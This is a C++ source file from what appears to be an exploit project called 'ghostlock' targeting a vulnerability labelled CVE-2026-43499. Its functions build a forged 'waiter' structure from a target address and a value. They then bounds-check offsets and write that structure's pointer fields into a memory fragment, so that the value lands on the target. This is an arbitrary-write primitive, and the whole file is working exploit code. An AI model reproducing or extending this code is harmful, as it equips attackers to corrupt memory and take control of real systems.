/** @file memory/write_encoder.cpp
 *  The arm words, and writing them only where they fit.
 */
#include "backend/cve_2026_43499/memory/write_encoder.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    namespace {
        bool fits(std::size_t size, std::size_t offset, std::size_t width) noexcept {
            return offset <= size && width <= size - offset;
        }

        void put_word(std::uint8_t *fragment, std::size_t offset, std::uint64_t value,
                      std::size_t width) noexcept {
            for (std::size_t i = 0U; i < width; ++i) {
                fragment[offset + i] = static_cast<std::uint8_t>((value >> (i * 8U)) & 0xFFU);
            }
        }
    }  // namespace

    WriteArm arm_for(const WriteRequest &request, std::uint64_t value,
                     std::size_t pointer_bytes) noexcept {
        WriteArm arm{};
        if (pointer_bytes == 0U) {
            return arm;
        }
        const std::uint64_t backstep = static_cast<std::uint64_t>(pointer_bytes);
        if (request.preserve_child) {
            /* Aimed at the value: the left field carries the target so the write
             * lands on it. */
            arm.pc = value;
            arm.left = request.target;
            return arm;
        }
        /* Aimed at the target itself, with both side fields zero: this is the arm
         * the tree's own fixed vectors pin, and the one a leaf write needs -- the
         * value would otherwise be written beside the field rather than on it. */
        arm.pc = request.target >= backstep ? request.target - backstep : 0U;
        arm.left = 0U;
        return arm;
    }

    EncodeVerdict encode_waiter_arm(std::uint8_t *fragment, std::size_t fragment_size,
                                    const WaiterFieldOffsets &offsets, const WriteArm &arm,
                                    std::size_t pointer_bytes) noexcept {
        if (fragment == nullptr || fragment_size == 0U) {
            return EncodeVerdict::FragmentTooSmall;
        }
        if (pointer_bytes == 0U || pointer_bytes > sizeof(std::uint64_t)) {
            return EncodeVerdict::WidthInvalid;
        }
        /* Every field is checked before anything is written: a fragment that
         * cannot hold the arm is left exactly as it was. */
        if (!fits(fragment_size, offsets.pc, pointer_bytes) ||
            !fits(fragment_size, offsets.right, pointer_bytes) ||
            !fits(fragment_size, offsets.left, pointer_bytes)) {
            return EncodeVerdict::FragmentTooSmall;
        }
        put_word(fragment, offsets.pc, arm.pc, pointer_bytes);
        put_word(fragment, offsets.right, arm.right, pointer_bytes);
        put_word(fragment, offsets.left, arm.left, pointer_bytes);
        return EncodeVerdict::Ok;
    }
}  // namespace ghostlock::backend::cve_2026_43499::memory
